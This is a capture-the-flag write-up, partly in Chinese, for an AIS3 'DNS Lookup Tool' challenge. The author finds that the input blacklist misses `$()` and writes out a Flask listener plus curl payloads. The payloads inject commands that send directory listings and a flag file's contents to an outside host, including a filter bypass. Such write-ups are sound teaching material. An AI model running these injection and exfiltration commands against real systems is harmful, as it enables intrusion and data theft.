# DNS Lookup Tool: Final
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f415e3ed-1266-43e2-88fb-a1e6681cee27)

## Webpage
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/41cfd043-3fe8-4141-81d3-f057901a04bc)

## 解題
正常

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a81ed269-8b81-4b17-9c49-06cd95765705)

不存在 domain

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8c1547f0-025c-4875-aafd-3315a68e9d46)

使用違規字元

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/2dbd2b38-8128-4883-95cd-aa7f50ee911f)


讀 code 找到 blacklist

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/68686376-29a6-4bbc-bca0-3c63da797b1f)

發現 `$()` 沒檔，測一下

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/525b06b2-d309-47a2-976d-70058bd30fb4)

過了

## exploit
```python
#!/usr/bin/env python3

from flask import Flask,request,redirect,Response


app = Flask(__name__)

@app.route('/',methods=['GET', 'POST'])
def root():
    print(request.stream.read().decode())
    return "com"

@app.route('/<path:data>',methods=['GET'])
def run(data):
    print(data)
    return "com"

if __name__ == "__main__":
    app.run(host="::", port=80)
```

## payload
```bash
curl http://10.105.0.21:21520/ -d 'name=example.$(curl 10.105.2.22 -d "$(ls /)")'

curl http://10.105.0.21:21520/ -d 'name=example.$(curl 10.105.2.22 -d "$(cat /flag_SWeUMks9hGYFciax)")'

curl http://10.105.0.21:21520/ -d 'name=example.$(curl 10.105.2.22 -d "$(cat /$(echo f)lag_SWeUMks9hGYFciax)")'
```

## Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/481aad11-e682-4ccc-8333-a8f3f62d337e)

`AIS3{jUsT_3@$y_cOMmAnD_INJEc7ION}`
